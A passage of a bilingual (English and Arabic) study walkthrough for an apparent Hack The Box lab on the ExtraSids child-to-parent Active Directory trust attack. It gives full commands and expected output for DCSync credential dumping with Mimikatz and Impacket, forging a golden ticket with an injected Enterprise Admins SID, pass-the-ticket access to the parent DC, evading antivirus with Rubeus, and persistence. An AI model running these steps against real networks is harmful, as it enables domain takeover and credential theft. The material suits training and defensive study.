# Method 4: Ping (if ICMP not blocked)
ping ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

**From Linux, after getting the IP:**
```bash
# Add to /etc/hosts to make hostname resolution work from your Linux machine
echo "<PARENT_DC_IP>  ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL INLANEFREIGHT.LOCAL" | sudo tee -a /etc/hosts

# Verify
ping -c 1 ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

> **CPTS Lesson:** In the CPTS exam, you'll often only get one IP and need to discover the rest of the network through enumeration. Always enumerate hostnames and IPs before attacking.

---

### 🔥 What If #6 — You Need to Perform a DCSync Attack on the PARENT Domain (Full Forest Compromise)?

> **This is the "Next Steps" section** — after you've successfully read the flag via ExtraSids, the logical next step is to DCSync the parent domain's `krbtgt` and Administrator hashes to achieve **complete, persistent forest compromise.**

**Once you have Enterprise Admin access via the forged ticket:**

```powershell
# Option A: From Windows, DCSync the parent domain's krbtgt and Administrator
# (Run inside Mimikatz, using your injected Enterprise Admin ticket)
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\Administrator
```

```bash
# Option B: From Linux with Impacket (using your .ccache ticket)
export KRB5CCNAME=./hacker.ccache
python3 secretsdump.py -k -no-pass INLANEFREIGHT.LOCAL/hacker@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -just-dc-user INLANEFREIGHT/krbtgt
```

**Why this matters:**
- Getting the parent domain's `krbtgt` hash lets you create a **new, direct Golden Ticket for the parent domain** — no more dependency on the cross-domain trust path
- Getting the parent `Administrator` hash lets you **Pass-the-Hash directly** into any machine in the forest
- This represents **full forest compromise** — the highest level of AD attack

> **CPTS Lesson:** On the actual CPTS exam, the goal isn't just to read one flag. You're expected to demonstrate the **full kill chain**: foothold → privilege escalation → domain admin → forest admin → complete persistence. DCSync on the parent domain after the ExtraSids attack is the logical conclusion of a Child → Parent trust attack.

---

## 📋 Quick Reference Cheat Sheet

```
=== EXTRASIDS ATTACK COMMAND SUMMARY ===

[1] CONNECT VIA RDP
xfreerdp /v:10.129.180.47 /u:htb-student_adm /p:'HTB_@cademy_stdnt_admin!' /cert-ignore

[2] LOAD POWERVIEW & GET SIDs
Import-Module C:\Tools\PowerView.ps1
Get-DomainSID                                              ← Q1 Answer (Child SID)
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid  ← Q2 Answer

[3] GET KRBTGT HASH (Mimikatz)
privilege::debug
lsadump::dcsync /user:LOGISTICS\krbtgt
→ Note the "Hash NTLM:" value

[4] CREATE GOLDEN TICKET (Mimikatz)
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_SID> /krbtgt:<NTLM_HASH> /sids:<EA_SID> /ptt

[5] VERIFY TICKET
klist

[6] READ FLAG (Q3)
type \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\flag.txt
```

> 🎓 **Final Note for CPTS Journey:** The ExtraSids attack is one of the most powerful techniques in Active Directory. The formula is: **Child Domain DA + KRBTGT hash + Enterprise Admins SID = Full Forest Compromise.** Understand WHY it works (no SID filtering in the same forest) and you'll be able to adapt it to any AD environment you encounter on the exam or in the real world.

---

```
  ══════════════════════════════════════════════════════════════════
  [✓] PHASE_II ATTACK SEQUENCES DOCUMENTED
  [✓] 6 / 6 EXPLOITATION METHODS CAPTURED
  [→] LOADING DEEP-DIVE ANALYSIS & GLOSSARY . . .
  ══════════════════════════════════════════════════════════════════
```

---

## 🔴 PHASE_III — دليل الاختراق :: التحليل والمصطلحات

> [!warning] ⚠️ PHASE III INITIALIZED · EXPLOITATION GUIDE & GLOSSARY **Language:** Arabic + English Mixed — **Size:** ~2,000 Words **Content:** Arabic breakdown of all 6 methods · Flashcards · Cheat Sheet · Golden Tips.

---

تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

  

━━━━━

  

🟢 المرحلة 0: ما قبل الصفر — Big Picture

  

━━━━━

  

شوف صديقي، قبل لا نكتب أي أمر، لازم نفهم "ليش" هذا الهجوم موجود أصلاً وشلون يشتغل. تخيل وياي السيناريو التالي بحياتنا الواقعية:

  

تخيل شركة عملاقة اسمها (الشركة الأم - INLANEFREIGHT)، هاي الشركة عندها فرع رئيسي (HQ) وعندها فروع أصغر مثل فرع الدعم اللوجستي (LOGISTICS). بعالم الـ Active Directory، الشركة كلها نسميها "Forest" (غابة)، والفرع الرئيسي هو الـ "Parent Domain"، والفرع اللوجستي هو الـ "Child Domain".

  

بين هذي الفروع اكو شي اسمه "Trust" (ثقة). يعني موظف بفرع اللوجستيات يكدر يطبع أوراق بطابعة موجودة بالفرع الرئيسي، لأن الإدارة مسوية ثقة متبادلة (Two-way Trust) بيناتهم لتسهيل الشغل.

  

هسة نجي لمشكلة الـ **SID History** (تاريخ المعرّفات الأمنية):

مرات الشركات تندمج أو تنقل موظفين من فرع لفرع. لما موظف ينتقل من (LOGISTICS) إلى (INLANEFREIGHT)، الإدارة تنطيه هوية جديدة (SID جديد) بالفرع الرئيسي. بس حتى لا يفقد صلاحياته القديمة على ملفاته بالفرع القديم، يخلون رقم هويته القديمة بحقل اسمه "SID History" داخل هويته الجديدة. يعني النظام يكول: "هذا الموظف هويته الجديدة X، بس تراه هو نفسه صاحب الهوية القديمة Y، فمشّي أموره بالفرعين".

  

شنو الخلل الجوهري اللي راح نستغله بهجوم الـ ExtraSids؟

الخلل هو أن شركة مايكروسوفت (بشكل افتراضي) **لا تقوم بتصفية أو فلترة الـ SID History** بين الدومينات اللي تنتمي لنفس الغابة (Intra-forest trust). يعتبرون الغابة كلها "حد أمني واحد".

  

هنا يجي دورنا كـ Hackers:

إذا إحنا قدرنا نخترق الفرع الصغير (LOGISTICS) وصرنا "Domain Admin" هناك، راح نكدر نسرق مفتاح التشفير الرئيسي للفرع الصغير (حساب اسمه KRBTGT).

باستخدام هذا المفتاح، راح "نزوّر" تذكرة دخول (Golden Ticket) ونكتب بيها:

"أني فلان، من فرع اللوجستيات... **وبالمناسبة، بالـ SID History مالتي، أني عندي هوية مدير عام الشركة كلها (Enterprise Admin)!**"

  

بما أن الفرع الرئيسي (Parent Domain) يثق بالفرع الصغير (Child Domain) وما يفلتر الـ SID History، راح يشوف التذكرة مالتنا، يشوف توقيع الفرع الصغير (اللي هو صحيح لأننا سرقنا المفتاح)، ويشوف إننا كاتبين عندنا صلاحية "مدير عام"، فراح يكول: "تفضل أستاذ، السيرفرات كلها تحت أمرك!".

  

النتيجة؟ قدرنا نعبر من مجرد "أدمن على فرع صغير" إلى "أدمن على الغابة كلها" ونسيطر على الشركة الأم بالكامل. هذي التقنية خطيرة جداً وتعتبر من أقوى هجمات الـ Active Directory (AD). بالنهاية راح نتعلم شلون نطلع هويات الدومينات، شلون نسرق المفتاح بـ DCSync، وشلون نزوّر التذكرة ونعبر الحدود.

  

━━━━━

  

🔵 المرحلة 1: المصطلحات

  

━━━━━

  

هسة خلينا نفسخ المصطلحات الموجودة بالتحدي والأدوات اللي راح نستخدمها، حتى من نكتبها تكون فاهم كل حرف:

  

Active Directory Forest (الغابة)

  

- شنو يعني؟ هو الهيكل التنظيمي الأعلى بعالم مايكروسوفت. الغابة تضم كل الشركات والفروع (Domains) التابعة لنفس المؤسسة. كل دومين داخل الغابة يثق بالدومينات الأخرى افتراضياً.
    
      
    

Domain Controller / DC (متحكم المجال)

  

- شنو يعني؟ هو السيرفر الزعيم بالدومين. هو اللي يخزن أسماء المستخدمين، الباسوردات، وصلاحياتهم. من تسجل دخول بحاسبة الشركة، الـ DC هو اللي يكول "مسموح" أو "مرفوض". بالتحدي مالتنا عدنا اثنين: `ACADEMY-EA-DC01` (الأب) و `ACADEMY-EA-DC02` (الابن).
    
      
    

Trust (علاقة الثقة)

  

- شنو يعني؟ اتفاقية بين اثنين Domains تسمح لمستخدمين واحد منهم بالوصول لموارد الثاني. بالـ نفس الغابة (Parent-Child)، الثقة تكون متبادلة (Two-way) وتلقائية.
    
      
    

SID (Security Identifier) (المعرّف الأمني)

  

- شنو يعني؟ رقم فريد جداً مثل رقم الهوية الوطنية، ينعطي لكل يوزر، كروب، وحتى للدومين نفسه. شكله يبدأ بـ `S-1-5-21-`. الويندوز ما يتعامل بالأسماء، يتعامل بهذا الرقم.
    
      
    

RID (Relative Identifier) (المعرّف النسبي)

  

- شنو يعني؟ هو الجزء الأخير من الـ SID. الدومين كله عنده SID طويل، والـ RID ينضاف بنهايته حتى يميّز يوزر عن يوزر.
    
      
    
- مثال: أدمن الدومين دائماً الـ RID مالته `500`. والـ Enterprise Admins دائماً الـ RID مالتهم `519`.
    
      
    

Enterprise Admins (مدراء المؤسسة/الغابة)

  

- شنو يعني؟ أعلى وأقوى مجموعة (Group) بالـ Active Directory كله. اللي يدخل بهالكروب يصير إله سيطرة مطلقة على الغابة (Forest) كلها بكل فروعها. الـ RID مالتهم دائماً `-519` وموجودين فقط بالـ Parent Domain.
    
      
    

KRBTGT (حساب تذاكر كيربيروس)

  

- شنو يعني؟ حساب مخفي وموجود بكل Domain. الباسورد مالته (الـ Hash) يُستخدم كـ "ختم" لتشفير وتوقيع كل تذاكر الدخول بالدومين. إذا سرقت هذا الختم، تقدر تزوّر أي تذكرة!
    
      
    

DCSync (تزامن متحكمات المجال)

  

- شنو يعني؟ هجوم نستخدم بيه أداة (مثل Mimikatz) حتى نتظاهر كأننا Domain Controller ثاني، ونطلب من الـ DC الحقيقي يسويلنا "مزامنة" (Sync) للباسوردات. هي ميزة طبيعية بالويندوز، بس احنا نستغلها لسرقة الـ hashes بدون ما نلمس الذاكرة.
    
      
    

Golden Ticket (التذكرة الذهبية / TGT)

  

- شنو يعني؟ تذكرة كيربيروس (TGT) مزورة بالكامل. نصنعها يدوياً باستخدام الـ Hash مال حساب KRBTGT اللي سرقناه. نقدر نحدد بيها أي يوزر (حتى لو وهمي) ونعطيه أي صلاحيات تعجبنا.
    
      
    

SID History (تاريخ المعرّفات)

  

- شنو يعني؟ ميزة صُممت لتسهيل نقل الموظفين بين الدومينات. تحتفظ بالـ SID القديم للموظف. بهجومنا (ExtraSids)، راح نحقن الـ SID مال الـ Enterprise Admins داخل هذا الحقل بالتذكرة الذهبية مالتنا.
    
      
    

PAC (Privilege Attribute Certificate) (شهادة سمات الامتياز)

  

- شنو يعني؟ جزء مشفر داخل تذكرة الكيربيروس، يحتوي على كل الـ SIDs والكروبات اللي ينتمي إلها اليوزر (بما فيها الـ SID History). الـ DC يقرأ الـ PAC حتى يقرر شنو الصلاحيات اللي يعطيك إياها.
    
      
    

Mimikatz (أداة ميميكاتز)

  

- شنو يعني؟ أشهر وأقوى أداة لاختراق الـ Windows واستخراج كلمات المرور والتلاعب بتذاكر الكيربيروس (Kerberos). راح نستخدمها للـ DCSync وصناعة الـ Golden Ticket.
    
      
    

PowerView (باور فيو)

  

- شنو يعني؟ سكريبت مكتوب بـ PowerShell يستخدم لعمل استطلاع وتعداد (Recon) كامل للـ Active Directory واستخراج الـ SIDs واليوزرات.
    
      
    

━━━━━

  

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

  

━━━━━

  

📖 ترجمة التحدي:

أنت حالياً داخل سيرفر (Child DC) اسمه `ACADEMY-EA-DC02` والـ IP مالته `10.129.180.47`. أنت تملك صلاحيات أدمن عليه (دومين: `LOGISTICS.INLANEFREIGHT.LOCAL`).

هدفك: تخترق السيرفر الأب (Parent DC) اللي اسمه `ACADEMY-EA-DC01` والتابع لدومين `INLANEFREIGHT.LOCAL` وتقرأ ملف سري (flag).

  

🎯 معطيات السيناريو:

  

- مكانك الحالي: Child Domain Controller (مخترق وجاهز).
    
      
    
- اليوزر مالتك: `htb-student_adm` (عنده صلاحيات Domain Admin بالفرع الصغير).
    
      
    
- الهدف النهائي: Parent Domain Controller.
    
      
    

❓ المطلوب:

  

- إجابة السؤال 1 (Q1): استخراج الـ SID مال الدومين الصغير (LOGISTICS).
    
      
    
- إجابة السؤال 2 (Q2): استخراج الـ SID مال كروب الـ Enterprise Admins بالدومين الأب.
    
      
    
- إجابة السؤال 3 (Q3): قراءة الفلاك (Flag) من الدومين الأب باستخدام التذكرة المزورة.
    
      
    

🧭 كيف تفكر؟ — Decision Tree لهجوم Child-to-Parent Trust:

  

```
هل نحن أدمن في الـ Child Domain؟
├── لا → لازم نسوي PrivEsc أو نلقي مسار لـ DA بالـ Child أولاً.
└── نعم → (حالتنا) ممتاز، نقدر نستخدم ExtraSids Attack.
    ├── هل الـ SID Filtering مفعل على الثقة (Trust)؟
    │   ├── نعم → الهجوم يفشل، لازم ندور على ثغرات ثانية (Kerberoasting أو ACL).
    │   └── لا → (حالتنا الافتراضية داخل الـ Forest) الهجوم ينجح!
    │
    └── خطواتنا:
        ١. نطلع هوية الدومين الحالي (Child SID).
        ٢. نطلع هوية الهدف (Enterprise Admins SID).
        ٣. نسرق مفتاح التشفير (KRBTGT Hash) مالت الدومين الصغير بـ DCSync.
        ٤. نزوّر تذكرة ذهبية (Golden Ticket) ونحط هوية الهدف بالـ SID History.
        ٥. نحقن التذكرة بالذاكرة (Pass The Ticket).
        ٦. ندخل على سيرفر الأب ونقرا الملف براحتنا.
```

🗺️ خريطة الهجوم (Roadmap):

١. الدخول بالـ RDP وتجهيز الأدوات.

٢. استخدام PowerView لاستخراج الـ SID الأول والثاني.

٣. تشغيل Mimikatz وعمل DCSync لحساب krbtgt.

٤. إنشاء التذكرة الذهبية بـ Mimikatz وحقنها.

٥. التحقق من التذكرة ثم الوصول لملفات الـ Parent DC السريّة.

  

━━━━━

  

🟠 المرحلة 3: الاستغلال التفصيلي

  

━━━━━

  

هسة وصلنا للشغل العملي. راح نطبق الخطة خطوة بخطوة.

  

الخطوة [0]: الدخول للسيرفر الصغير (Child DC)

  

📌 ليش نسوي هاي الخطوة؟

نحتاج نفتح واجهة السيرفر (RDP) حتى نقدر ننفذ أدواتنا من داخله بما إننا نملك صلاحيات الأدمن عليه.

  

🔧 الأمر:

  

Bash

```
xfreerdp /v:10.129.180.47 /u:htb-student_adm /p:'HTB_@cademy_stdnt_admin!' /cert-ignore /dynamic-resolution
```

💡 ليش هذا الأمر بالذات؟

استخدمنا أداة `xfreerdp` باللينكس. `-v` لتحديد الـ IP، `-u` لليوزر، `-p` للباسورد، و `-cert-ignore` حتى نتجاهل أخطاء الشهادات وتفتح الشاشة عدنا.

بمجرد ما تفتح الشاشة، راح نفتح نافذة PowerShell بصلاحيات أدمن (Run as Administrator).

  

الخطوة [1]: استخراج الـ SID للدومين الصغير (Q1)

  

📌 ليش نسوي هاي الخطوة؟

التذكرة الذهبية تحتاج تعرف هي تابعة لأي دومين بالظبط. فلازم نجيب الـ SID الأساسي مال دومين LOGISTICS.

  

🔧 الأمر:

  

PowerShell

```
# نتجاوز سياسة الحماية مال الويندوز حتى نقدر نشغل سكريبتات خارجية
Set-ExecutionPolicy Bypass -Scope Process -Force

# نحمل أداة PowerView للذاكرة
Import-Module C:\Tools\PowerView.ps1

# نجيب الـ SID مال الدومين الحالي مالتنا
Get-DomainSID
```

📤 الـ Output المتوقع:

  

Plaintext

```
S-1-5-21-2806153819-209893948-922872689
```

✅ الخطوة التالية:

هذا الرقم هو جواب السؤال الأول (Q1). انسخه وحطه بملف نصي (Notepad) لأن راح نحتاجه بصناعة التذكرة.

  

الخطوة [2]: استخراج الـ SID لكروب الـ Enterprise Admins (Q2)

  

📌 ليش نسوي هاي الخطوة؟

هاي هي "بطاقة الـ VIP" اللي نريد نزورها ونحطها بالـ SID History. لازم نستعلم من الدومين الأب (INLANEFREIGHT) عن الـ SID الخاص بكروب الـ Enterprise Admins.

  

🔧 الأمر:

  

PowerShell

```
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname, objectsid
```

💡 ليش هذا الأمر بالذات؟

أداة PowerView تكدر تسأل دومينات ثانية. حددنا الدومين الأب بـ `-Domain`، وحددنا اسم الكروب بـ `-Identity`، وطلبنا يعرضلنا بس الـ `objectsid` للترتيب.

  

📤 الـ Output المتوقع:

  

Plaintext

```
distinguishedname                                         objectsid
-----------------                                         ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL   S-1-5-21-3842939050-3880317879-2865463114-519
```

✅ الخطوة التالية:

هذا هو جواب السؤال الثاني (Q2). شوف الرقم ينتهي بـ `-519`، وهذا ثابت لكل كروبات الـ Enterprise Admins بالعالم. انسخه يمك بملف الـ Notepad.

  

الخطوة [3]: سرقة مفتاح الدومين الصغير (KRBTGT Hash) بـ DCSync

  

📌 ليش نسوي هاي الخطوة؟

التذكرة الذهبية لازم تتوقع وتتشفّر بمفتاح الدومين (KRBTGT). راح نستخدم Mimikatz حتى نخدع السيرفر ونخليه يعطينا هذا الـ Hash.

  

🔧 الأمر:

  

PowerShell

```
# ندخل لمسار الأداة ونشغلها
cd C:\Tools\mimikatz\
.\mimikatz.exe

# داخل ميميكاتز، نطلب صلاحيات عليا (Debug)
privilege::debug

# نسوي المزامنة الوهمية لسرقة الباسورد
lsadump::dcsync /user:LOGISTICS\krbtgt
```

💡 ليش هذا الأمر بالذات؟

`privilege::debug` تفهم الويندوز إننا برنامج نظام يحتاج صلاحيات قراءة الذاكرة. `lsadump::dcsync` هو أمر استغلال بروتوكول المزامنة (DRSUAPI)، وحددنا اليوزر اللي نريده `LOGISTICS\krbtgt`.

  

📤 الـ Output المتوقع:

  

Plaintext

```
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **
SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
```

✅ الخطوة التالية:

ننسخ قيمة الـ `Hash NTLM` اللي طلعت (بالحالة مالتي `9d765b482771505cbe97411065964d5f`). هسة صار عدنا كل المكونات جاهزة لطبخة التذكرة الذهبية!

  

📊 لحد هسة:

[x] حصلنا الـ Child SID

[x] حصلنا الـ Parent EA SID

[x] حصلنا الـ KRBTGT Hash

[ ] الخطوة الجاية: تزوير التذكرة وحقنها.

  

الخطوة [4]: صناعة التذكرة الذهبية + ExtraSids (السحر الحقيقي)

  

📌 ليش نسوي هاي الخطوة؟

راح ننطي أوامر لـ Mimikatz حتى يخلقلنا تذكرة جديدة. راح نحط بيها اسم وهمي (hacker)، ونعطيها مفتاح الـ krbtgt اللي سرقناه، والأهم: نحقن الـ SID مال الـ Enterprise Admins بخانة الـ SID History.

  

🔧 الأمر (كلّه سطر واحد داخل ميميكاتز):

  

Plaintext

```
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

💡 ليش هاي الـ Flags بالذات؟

  

- `/user:hacker` اسم اليوزر داخل التذكرة (يكدر يكون أي شي).
    
      
    
- `/domain:` الدومين الحالي مالتنا (الصغير).
    
      
    
- `/sid:` الـ SID مال الدومين الصغير (جواب Q1).
    
      
    
- `/krbtgt:` الـ Hash اللي سرقناه بـ DCSync.
    
      
    
- `/sids:` (هذا أهم فلاج!) هذا الـ SID History. حطينا بيه الـ SID مال الدومين الأب اللي نهايته 519 (جواب Q2).
    
      
    
- `/ptt` يعني Pass-The-Ticket: لا تحفظ التذكرة بملف، بس احقنها مباشرة بالذاكرة مال الجلسة الحالية (جلسة الـ PowerShell مالتنا).
    
      
    

📤 الـ Output المتوقع:

  

Plaintext

```
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : [date] ; [date] ; [date]
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

✅ الخطوة التالية:

التذكرة انحقنت بنجاح! هسة نطلع من ميميكاتز (نكتب `exit`) ونفحص هل التذكرة موجودة بالذاكرة فعلاً.

  

```
[Attack Flow - ASCII Diagram]
+-------------------+       TGT + ExtraSids (EA)     +-------------------+
| Child DC (Owned)  | -----------------------------> | Parent DC (Target)|
| LOGISTICS.INL...  | <----------------------------- | INLANEFREIGHT...  |
| user: htb-admin   |       Access Granted!          | Admin access OK!  |
+-------------------+                                +-------------------+
```

الخطوة [5]: التحقق وقراءة الفلاك (Q3)

  

📌 ليش نسوي هاي الخطوة؟

الخطوة الأخيرة، نتاكد إن التذكرة بالذاكرة باستخدام أداة الويندوز `klist`، وبعدين نحاول ندخل على قرص الـ C مال الدومين الأب (اللي المفروض ممنوع علينا) ونقرا الملف السري.

  

🔧 الأمر:

  

PowerShell

```
# نتحقق من التذاكر بالذاكرة
klist

# نستعرض ملفات الدومين الأب
ls \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\

# نقرا الفلاك
type \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\flag.txt
```

💡 ليش هذا الأمر بالذات؟

الـ `\\ServerName\c$` هو مسار شبكي (SMB Share) لقرص الـ C المخفي. الويندوز راح يرسل التذكرة الذهبية مالتنا بصمت للسيرفر الأب، والسيرفر الأب راح يقرأ الـ Extra Sids، يشوفنا `Enterprise Admin`، ويفتح الباب. `type` هو أمر الويندوز لطباعة محتوى الملفات النصية.

  

📤 الـ Output المتوقع:

  

Plaintext

```
Current LogonId is 0:0x12d5f3
Cached Tickets: (1)
#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
...

    Directory: \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        [date]              [size] flag.txt

f@ll1ng_l3@ves
```

⏸️ Mini-check: هل طلع الفلاك `f@ll1ng_l3@ves` بدون رسالة Access Denied؟ نعم! الاختراق تم بنجاح وسيطرنا على الغابة كاملة.

  

📐 ملخص الإجابات / النتائج:

  

|**الخطوة**|**الأداة**|**النتيجة (جواب الأسئلة)**|
|---|---|---|
|Q1 (Child SID)|PowerView|S-1-5-21-2806153819...|
|Q2 (Parent EA SID)|PowerView|S-1-5-21-3842939050...-519|
|Q3 (The Flag)|Mimikatz + CMD|f@ll1ng_l3@ves|

━━━━━

  

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)

  

━━━━━

  

الـ CPTS وامتحانات الـ HTB مستحيل تمشي خط مستقيم دائماً. لازم تتوقع سيناريوهات الفشل (Bypasses) والأخطاء الكارثية (Traps):

  

🔄 Variations محتملة:

  

Variation 1: ماذا لو PowerView تم مسحه بواسطة الـ Antivirus؟

هذا وارد جداً! ما توكف، استخدم أوامر الويندوز الأصلية (Native CMDlets) اللي مستحيل تنمسح:

  

PowerShell

```
# لمعرفة الـ Child SID
(Get-ADDomain).DomainSID.Value

# لمعرفة Parent Enterprise Admins SID (هو دائماً الـ SID مال الأب + "-519")
$parentSID = (Get-ADDomain -Identity INLANEFREIGHT.LOCAL).DomainSID.Value
Write-Host "$parentSID-519"
```

Variation 2: ماذا لو Mimikatz انمسك وانحذف من قبل Windows Defender؟

عدنا طريقتين كبدائل:

البديل الأول (Rubeus): أداة Rubeus قوية جداً ببناء التذاكر ومرات يتجاهلها الـ AV. الأمر يصير:

  

PowerShell

```
.\Rubeus.exe golden /rc4:<Hash> /domain:<ChildDomain> /sid:<ChildSID> /sids:<EASID> /user:hacker /ptt
```

البديل الثاني (Impacket من اللينكس مالتك - الأفضل والمضمون): ما تحتاج ترفع أي ملف للويندوز. تنفذ هجوم DCSync عن بعد من جهازك الـ Kali باستخدام `secretsdump.py`، وبعدها تسوي التذكرة بـ `ticketer.py`.

  

Variation 3: ماذا لو التذكرة موجودة بالذاكرة بس يطلعلك "Access is Denied" لما تحاول تقرأ الـ Parent DC؟

  

- السبب الأول: الـ SID مالت الـ Enterprise Admins بي غلط (نقص رقم، أو ما نسخت الـ 519).
    
      
    
- السبب الثاني: مشكلة بالـ DNS (ما يقدر يترجم اسم السيرفر `ACADEMY-EA-DC01`). جرب تستخدم الـ IP مال Parent DC مباشرة بالمسار الشبكي.
    
      
    
- الحل دايماً: نظف الذاكرة بـ `klist purge` واصنع تذكرة جديدة.
    
      
    

Variation 4: ماذا لو الهجوم فشل تماماً برغم كل شي صح؟ (SID Filtering)

إذا الأدمن مال الشبكة فاهم شغله، راح يفعل خاصية `SID Filtering` (أو Quarantine) بين فروع الشركة. هاي الخاصية تلزم التذكرة مالتنا وتقص الـ SID History وتشمره بالزبالة، وتكول "ممنوع أحد يدّعي إنه من دومين ثاني".

إذا لگيت هاي الحالة، لازم تغير تكتيكك: تسوي enumeration بـ BloodHound وتدور على مسارات ثانية للـ Parent Domain مثل ثغرات ACL أو تسوي Kerberoasting على حسابات موجودة بالفرع الأب.

  

Variation 5: الخطوة اللي بعد الهجوم؟ (Full Forest Compromise)

بعد ما دخلت للسيرفر الأب بصلاحيات Enterprise Admin بالتذكرة، لا توكف هنا! هدفك هسة تسوي DCSync على الدومين الأب وتسحب الـ KRBTGT مالتهم والـ Administrator hash الأساسي. هيج راح تثبت سيطرتك للأبد (Persistence).

  

═══════════

  

⚠️ أخطاء كارثية شائعة (الفخوخ - Traps):

  

🚨 الفخ الأكبر بـ Golden Tickets: نسخ الـ NTLM Hash بشكل ناقص، أو أخذ الـ LM Hash بدل الـ NTLM. تأكد إنك تاخذ الـ Hash NTLM المكون من 32 حرف (Hex).

  

❌ الفخ الثاني: نسيان إعطاء فلاج `/ptt` (Pass The Ticket) بـ Mimikatz. إذا نسيته، راح يحفظ التذكرة كملف `.kirbi` بالقرص، وما راح تنحقن بالذاكرة، ومن تحاول تدخل للسيرفر الأب راح تنطرد.

  

❌ الفخ الثالث: الكيربيروس يعتمد بشكل مجنون على "الوقت" (Time Synchronization). إذا الساعة بحاسبتك الكالي تختلف عن السيرفر بأكثر من 5 دقائق (Clock Skew)، التذكرة مالتك راح تُرفض بـ Error `KRB_AP_ERR_SKEW`. دائماً زامن الوقت بـ `sudo ntpdate <DC_IP>`.

  

💡 Golden Tip:

"دائماً بهجمات الـ Active Directory، احفظ مساراتك بالـ BloodHound أولاً. الـ Trust مسارات خطيرة، والـ SID مالت اليوزر هو هويته. لا تكتب أمر بميميكاتز إذا ما كنت فاهم كل فلاج شنو يمثل بالمعمارية مال AD!"

  

━━━━━

  

💎 الفلاشكاردز — ملخص سريع للحفظ

  

━━━━━

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

❓ Front: شنو هو الـ ExtraSids Attack باختصار؟

✅ Back: استغلال عدم فلترة الـ SID History بـ Intra-forest trust لرفع الصلاحيات من دومين الابن إلى الأب عن طريق تذكرة ذهبية مزورة.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

❓ Front: شنو الـ RID الثابت لكروب Enterprise Admins؟

✅ Back: هو 항상 `-519`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

❓ Front: شنو نحتاج حتى نصنع Golden Ticket بـ ExtraSids؟

✅ Back: Child Domain SID + Parent Enterprise Admins SID + Child KRBTGT NTLM Hash.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

❓ Front: شلون نجيب الـ KRBTGT Hash بدون ما ندخل للسيرفر شخصياً؟

✅ Back: باستخدام DCSync (عبر Mimikatz `lsadump::dcsync` أو Impacket `secretsdump.py`).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

❓ Front: أمر استخراج الـ Domain SID بالباور شيل (بدون أدوات خارجية)؟

✅ Back: `(Get-ADDomain).DomainSID.Value`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

❓ Front: الفلاج الأهم بـ Mimikatz لحقن التذكرة بالذاكرة فوراً؟

✅ Back: `/ptt` (Pass The Ticket).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

❓ Front: إذا الـ SID Filtering مفعل، هل ينجح ExtraSids؟

✅ Back: لا، الهجوم يفشل تماماً لأن الـ Parent DC راح يفلتر (يمسح) الـ Extra SIDs من الـ PAC.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

━━━━━

  

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

  

━━━━━

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 ملخص هجوم ExtraSids (Child to Parent Trust)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

